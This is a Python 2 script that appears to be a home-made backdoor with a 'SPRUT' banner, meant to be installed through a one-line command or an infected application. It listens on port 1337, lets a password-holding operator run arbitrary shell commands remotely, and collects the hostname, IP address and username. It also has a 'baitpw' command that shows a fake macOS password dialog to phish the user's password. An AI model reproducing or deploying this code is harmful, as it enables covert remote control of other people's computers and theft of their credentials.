########
#Install:
#Single line python command using 'python -c %X'
#Infected application
#?
#yay
########
import socket
import subprocess
from subprocess import Popen, PIPE, STDOUT
from time import strftime
import sys
import hashlib
i = 0
log = []

def shell(cmd):
	p = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
	output = p.stdout.read()
	return output;

#def getinfo():
#	try:
#
def filtr(data):
	filtr1=list(data)
	del filtr1[-1]
	dat=''.join(filtr1)
	return dat;
def gethostname():
	try:
		proc2=subprocess.Popen("hostname", shell=True, stdout=subprocess.PIPE, )
		hn=proc2.communicate()[0]
		hn = filtr(hn)
		print "HOSTNAME:" + hn
		return hn;
	except Exception as e:
		print "Error fetching hostname", e
		return "HN_ERROR";
def getip():
		try:
			proc2=subprocess.Popen("ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'", shell=True, stdout=subprocess.PIPE, )
			output2=proc2.communicate()[0]
			ip = filtr(output2)
			print "IP:" + ip
			return ip;
		except Exception as e:
			print "Error fetching ip;", e
			return "IP_ERROR";


def getwho():
	try:
		proc2=subprocess.Popen("whoami", shell=True, stdout=subprocess.PIPE, )
		who=proc2.communicate()[0]
		who = filtr(who)
		print "WHO:" + who
		return who;
	except Exception as e:
		print "Error fetching whoami;", e
		return "WHO_ERROR";

def timestamp():
	nowtime = "[" + strftime("%Y-%m-%d %H:%M:%S") + "]"
	return nowtime;

def loggin(cmd):
	cmd = filtr(cmd)
	log_add = timestamp() + ' ' + cmd
	log_add = list(log_add)
	log_add = ''.join(log_add)
	log.append(log_add)
	print log_add
	return log_add;

def loggout(output):
	log_add = output
	log_add = list(log_add)
	log_add = ''.join(log_add)
	log.append(log_add)
	print log_add
	return log_add;

def serverstart(nc):
	
	logged = timestamp() + 'SESSION OPEN'
	log.append(logged)
	while True:
			if nc == 1: conn.sendall("%s@%s~$ " % (who, ip))
			data = conn.recv(1024)
			if not data: break
			command = data.split()[0]
			if command == "test": #THIS IS A TEMPLATE, REMEMBER THAT IT ONLY ACCEPTS ONE-WORD COMMANDS
				loggin(data)
				print timestamp() + "|TEST VERIFIED " 
				loggout("|TEST VERIFIED ")
				conn.sendall(timestamp() + "|TEST VERIFIED ")
			elif command == "cd": #THIS FIXES THE CD-BUG
				loggin(data)
				filtr1=list(data)
				del filtr1[-1]
				filtr1.append(';')
				prev.append(''.join(filtr1)) #gives the machine memory
				output = shell(data)
				loggout(output)
				conn.sendall(output)
			elif command == "baitpw": #Password bait					
				loggin(data)
				supercommand = """osascript -e 'tell application "Finder" to display dialog "Enter Password: " with icon caution without default answer with hidden answer'"""
				cmd = ''.join(prev) + data;
				log_add = timestamp() + ' ' + cmd
				print log_add
				output = shell(supercommand)
				loggout(output)
				conn.sendall(output)
			elif command == "startssh": #Start ssh
				supercommand = """"""

			elif command == "close": #Closes the sessions
				loggin(data)
				print "Closing session"
				loggin("-SESSION CLOSED- ")
				dt = (strftime("%d%m%Y"))
				f = open("log%s.txt" % dt , "w")
				i=0
				while not i == len(log):
					f.write("%s \n" % log[i])
					i = i + 1
				f.close()
				print "logging complete"
				return "session closed";
			elif command == "sclose": #Closes the connection
				loggin(data)
				print "Recieved close, shutting down"
				#s.shutdown(1)
				loggin("socket.shutdown")
				conn.close()
				dt = (strftime("%d%m%Y"))
				f = open("log%s.txt" % dt , "w")
				i=0
				while not i == len(log):
					f.write("%s \n" % log[i])
					i = i + 1
				f.close()
				print "log complete"
				sys.exit()

			#Otherwise run it in shell
			else:
				loggin(data)
				cmd = ''.join(prev) + data;
				output = shell(cmd)
				loggout(output)
				conn.sendall(output)
				if len(prev) > 4: del prev [-1];
class bc:
	PINK = '\033[95m'
	BLUE = '\033[94m'
	GREEN = '\033[92m'
	YELLOW = '\033[93m'
	RED = '\033[91m'
	ENDC = '\033[0m'

print """
  sSSs   .S_sSSs     .S_sSSs     .S       S.   sdSS_SSSSSSbs  
 d%%SP  .SS~YS%%b   .SS~YS%%b   .SS       SS.  YSSS~S%SSSSSP  
d%S'    S%S   `S%b  S%S   `S%b  S%S       S%S       S%S       
S%|     S%S    S%S  S%S    S%S  S%S       S%S       S%S       
S&S     S%S    d*S  S%S    d*S  S&S       S&S       S&S       
Y&Ss    S&S   .S*S  S&S   .S*S  S&S       S&S       S&S       
`S&&S   S&S_sdSSS   S&S_sdSSS   S&S       S&S       S&S       
  `S*S  S&S~YSSY    S&S~YSY%b   S&S       S&S       S&S       
   l*S  S*S         S*S   `S%b  S*b       d*S       S*S       
  .S*P  S*S         S*S    S%S  S*S.     .S*S       S*S       
sSS*S   S*S         S*S    S&S   SSSbs_sdSSS        S*S       
YSS'    S*S         S*S    SSS    YSSP~YSSY         S*S       
        SP          SP                              SP        
        Y           Y                               Y         
                                                              	"""

while True:
	HOST = ''
	PORT = 1337
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	s.bind((HOST, PORT))
	s.listen(1)	
	conn, addr = s.accept()
	history = ['']
	print 'Connected by', addr
	ip = getip()
	who = getwho()
	hostname = gethostname()
	locked = 1
	data = conn.recv(1024)
	password = data.split()[0]
	prev = []
	if not data: break
	print password
	if hashlib.sha224(password).hexdigest() == "ea63e3986ada0b8ba3469b67cd2a2031a4b02986412aefa12998bc28":
		serverstart(0)
	elif hashlib.sha224(password).hexdigest() == "fb2f49dc11035d174a86175cebb5a13772ef90f98b169ac16543eb9f":
		serverstart(1)
	elif password=="info":
		#info = getinfo()
		info = ['hostname:', hostname, ';','who:', who,';','ip:', ip,';'] 
		info = ''.join(info)
		conn.sendall(info)
		s.close()
	else: 
		s.close()
		sys.exit()



